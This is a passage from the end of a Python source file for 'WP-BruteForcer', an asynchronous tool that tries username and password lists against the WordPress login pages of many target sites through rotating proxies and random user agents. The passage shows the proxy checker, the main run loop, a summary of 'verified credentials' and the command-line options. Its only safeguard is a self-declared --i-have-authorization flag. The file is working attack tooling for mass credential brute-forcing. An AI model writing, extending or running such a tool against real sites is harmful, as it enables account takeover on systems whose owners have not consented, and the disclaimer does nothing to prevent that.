        if self.proxy_pool.total == 0 or self.cfg.no_proxy:
            return
        while not self._stop.is_set():
            try:
                await asyncio.wait_for(self._stop.wait(), timeout=PROXY_CHECK_INTERVAL)
                return
            except asyncio.TimeoutError:
                pass

            check_url = (self._first_target or "").rstrip("/") + "/wp-login.php"
            if not check_url.startswith("http"):
                continue

            for proxy in list(self.proxy_pool.alive()):
                if self._stop.is_set():
                    return
                session = self._new_session(self.connectors.get(proxy))
                try:
                    await asyncio.wait_for(
                        self._request(session, "HEAD", check_url, proxy=proxy, retries=0),
                        timeout=max(5.0, self.cfg.timeout),
                    )
                    self.proxy_pool.report_success(proxy)
                except Exception:
                    self.proxy_pool.report_failure(proxy, weight=2)
                finally:
                    try:
                        await session.close()
                    except Exception:
                        pass

    async def _ui_loop(self) -> None:
        while True:
            try:
                self.ui.refresh(self.stats, self.proxy_pool, self._targets_total)
            except Exception:
                pass
            await asyncio.sleep(0.25)

    # -- main entry ------------------------------------------------------------------ #

    async def run(self) -> int:
        self.usernames = list(iter_lines(self.cfg.usernames, strip=True))
        if not self.usernames:
            self.ui.log("error", f"no usernames found in {self.cfg.usernames}")
            return 2

        self._targets_total = count_entries(self.cfg.targets)
        self.stats.targets_total = self._targets_total

        self.writer.open()
        self.error_log.open()

        self.ui.log(
            "info",
            f"targets≈{self._targets_total:,}  usernames={len(self.usernames):,}  "
            f"proxies={self.proxy_pool.total:,}  concurrency={self.cfg.threads}",
        )
        self.ui.start()

        queue: asyncio.Queue = asyncio.Queue(maxsize=2000)
        workers = [
            asyncio.create_task(self._target_worker(queue, i))
            for i in range(self._target_workers)
        ]
        producer = asyncio.create_task(self._producer(queue))
        validator = asyncio.create_task(self._proxy_validator())
        ui_task = asyncio.create_task(self._ui_loop())

        try:
            await producer
            await queue.join()
        except asyncio.CancelledError:
            pass
        finally:
            self._stop.set()
            for worker in workers:
                worker.cancel()
            validator.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            await asyncio.gather(validator, return_exceptions=True)
            ui_task.cancel()
            await asyncio.gather(ui_task, return_exceptions=True)
            await self.connectors.close()
            self.writer.close()
            self.error_log.close()
            self.ui.stop()

        self._print_summary()
        return 0

    def _print_summary(self) -> None:
        elapsed = max(0.001, time.time() - self.stats.start_time)
        table = Table(title="Session summary", box=box.ROUNDED, border_style="cyan")
        table.add_column("Metric", style="bold cyan")
        table.add_column("Value", justify="right")
        table.add_row("Targets processed", f"{self.stats.targets_done:,}")
        table.add_row("Targets skipped (non-WP)", f"{self.stats.targets_skipped:,}")
        table.add_row("Login attempts", f"{self.stats.attempts:,}")
        table.add_row(
            "Verified credentials",
            f"[bold green]{self.stats.successes:,}[/bold green]",
        )
        table.add_row(
            "Rejected false positives",
            f"[bold yellow]{self.stats.rejected:,}[/bold yellow]",
        )
        table.add_row("HTTP errors", f"{self.stats.errors:,}")
        table.add_row("Timeouts", f"{self.stats.timeouts:,}")
        table.add_row("Proxy errors", f"{self.stats.proxy_errors:,}")
        table.add_row("Elapsed", format_duration(elapsed))
        table.add_row("Average rate", f"{self.stats.attempts / elapsed:,.1f} attempts/s")
        table.add_row("Results file", str(self.cfg.output))
        self.console.print(table)


# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog=PROG,
        description="Concurrent WordPress credential tester (AUTHORIZED USE ONLY).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--i-have-authorization",
        action="store_true",
        help="REQUIRED: confirm you own or have written permission to test the targets.",
    )
    parser.add_argument("-t", "--targets", type=Path, help="File with target URLs/domains (one per line).")
    parser.add_argument("-u", "--usernames", type=Path, help="File with usernames (one per line).")
    parser.add_argument("-p", "--passwords", type=Path, help="File with passwords (one per line).")
    parser.add_argument("-P", "--proxies", type=Path, help="Optional proxy list file.")
    parser.add_argument("--no-proxy", action="store_true", help="Ignore the proxy file and connect directly.")
    parser.add_argument("-c", "--threads", type=int, default=50, help="Global concurrency.")
    parser.add_argument("--per-host", type=int, default=3, help="Max concurrent attempts per target.")
    parser.add_argument("--timeout", type=float, default=15.0, help="Request timeout in seconds.")
    parser.add_argument("--retries", type=int, default=2, help="Retries per failed request.")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between attempts per host (seconds).")
    parser.add_argument("-o", "--output", type=Path, default=Path("results.csv"), help="CSV output file.")
    parser.add_argument("--error-log", type=Path, default=None, help="Optional file for error logging.")
    parser.add_argument("--stop-on-success", action="store_true", help="Stop testing a target after the first valid credential.")
    parser.add_argument("--user-agent", default=None, help="Custom User-Agent (default: random from a built-in list).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose / debug logging.")
    parser.add_argument("--no-color", action="store_true", help="Disable colored output.")
    parser.add_argument("--check-wp", action="store_true", help="Verify the target runs WordPress before attacking it.")
    parser.add_argument("--version", action="version", version=f"{PROG} {VERSION}")
    return parser


def print_banner(console: Console) -> None:
    title = Text()
    title.append("WP-BruteForcer", style="bold cyan")
    title.append(f"   v{VERSION}", style="dim")
    subtitle = Text(
        "Concurrent WordPress credential testing — authorized targets only",
        style="italic white",
    )
    warning = Text(
        "⚠  Use only against systems you own or have explicit written permission to test.",
        style="bold red",
    )
    console.print(
        Panel(
            Group(Align.center(title), Align.center(subtitle), Text(""), Align.center(warning)),
            border_style="cyan",
            padding=(1, 4),
        )
    )


def config_from_args(args: argparse.Namespace) -> Config:
    return Config(
        targets=args.targets,
        usernames=args.usernames,
        passwords=args.passwords,
        proxies=args.proxies,
        no_proxy=args.no_proxy,
        threads=max(1, args.threads),
        per_host=max(1, args.per_host),
        timeout=max(1.0, args.timeout),
        retries=max(0, args.retries),
        delay=max(0.0, args.delay),
        output=args.output,
        error_log=args.error_log,
        stop_on_success=args.stop_on_success,
        user_agent=args.user_agent,
        verbose=args.verbose,
        no_color=args.no_color,
        check_wp=args.check_wp,
    )


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    console = Console(no_color=args.no_color, highlight=False)
    print_banner(console)

    if not args.i_have_authorization:
        console.print(
            Panel(
                Text(
                    "REFUSING TO RUN\n\n"
                    "This tool performs credential testing and must only be used against\n"
                    "systems you own or have explicit written permission to test.\n\n"
                    "Re-run with --i-have-authorization to confirm you have authorization.",
                    style="bold red",
                    justify="center",
                ),
                border_style="red",
                padding=(1, 4),
            )
        )
        return 2

    if not args.targets or not args.usernames or not args.passwords:
        console.print("[bold red]Error:[/] --targets, --usernames and --passwords are required.")
        return 2

    for label, path in (
        ("targets", args.targets),
        ("usernames", args.usernames),
        ("passwords", args.passwords),
    ):
        if not path.is_file():
            console.print(f"[bold red]Error:[/] {label} file not found: {path}")
            return 2

    if args.proxies is not None and not args.no_proxy and not args.proxies.is_file():
        console.print(f"[bold red]Error:[/] proxy file not found: {args.proxies}")
        return 2

    if sys.platform != "win32":
        try:
            import uvloop  # type: ignore

            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
            console.print("[dim]uvloop enabled[/dim]")
        except Exception:
            pass

    cfg = config_from_args(args)
    runner = Runner(cfg, console)

    try:
        return asyncio.run(runner.run())
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Interrupted by user.[/bold yellow]")
        return 130


if __name__ == "__main__":
    sys.exit(main())